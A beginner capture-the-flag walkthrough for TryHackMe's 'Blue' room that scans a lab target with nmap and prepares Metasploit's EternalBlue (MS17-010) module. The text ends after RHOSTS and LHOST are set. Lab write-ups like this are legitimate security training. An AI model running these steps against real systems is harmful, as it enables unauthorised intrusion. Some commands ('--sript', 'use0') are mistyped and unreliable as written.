# 💥 TryHackMe: Blue – EternalBlue Exploitation Walkthrough

Room Link: [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)  
Difficulty: Beginner  
Focus: MS17-010 Vulnerability (EternalBlue)

---

## 🔌 0. VPN Setup on Kali Linux (TryHackMe)

Before anything, connect to the TryHackMe network using OpenVPN.

### 📥 Download your VPN configuration file

1. Log in to [TryHackMe](https://tryhackme.com/)
2. Go to the **Access** page
3. Click **Download My Configuration File** (usually ends in `.ovpn`)

## 📂 Move the file to your system

If downloaded, Go to `Downloads` folder in your distro:
```bash
cd Downloads
```
## 🔐 Now Connect using OpenVPN 

```bash
sudo openvpn <select the downloaded file in folder>
```
![vpn configuration](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/vpn%20configuration.png?raw=true)
Next step,
## 📡 1. Network Scanning & Enumeration
### 🔍 Port Scanning with Nmap
```bash
nmap -sC -sV --sript vuln <TARGET_IP>
```
![nmap the TARGET ip](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/nmap.png?raw=true)

Sample output shows ports: 135, 139, 445 — indicating SMB is active.Sample output shows ports: 135, 139, 445 — indicating SMB is active.

## ⚔️ Step 2: Exploitation with Metasploit## 

We will now exploit the target using the MS17-010 (EternalBlue) vulnerability via Metasploit.

### 🧩 Launch Metasploit
```bash
msfconsole
```

![launching metasploit](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/msfconsole.png?raw=true)

Once inside Metasploit, search for the exploit module:

```bash
search eternal blue
```

![searching eternal blue in msf](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/Search.png?raw=true)

Select the first of the options shows;

```bash
use0
<next>
options
```

![msf console options](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/options.png?raw=true)

We can see the LHOSTS and RHOSTS are need to acquire the required IP Address of each;
So, set RHOSTS the <TARGET_IP> and LHOST must be the ip of ur vpn;

```bash
set RHOSTS <TARGET_IP>
set LHOST <YOUR_VPN_IP>
```

![assigning RHOSTS and LHOST](https://github.com/atlinpereira/tryhackme-lab-eternal-blue/blob/main/ss%20git/rhosts.png?raw=true  )

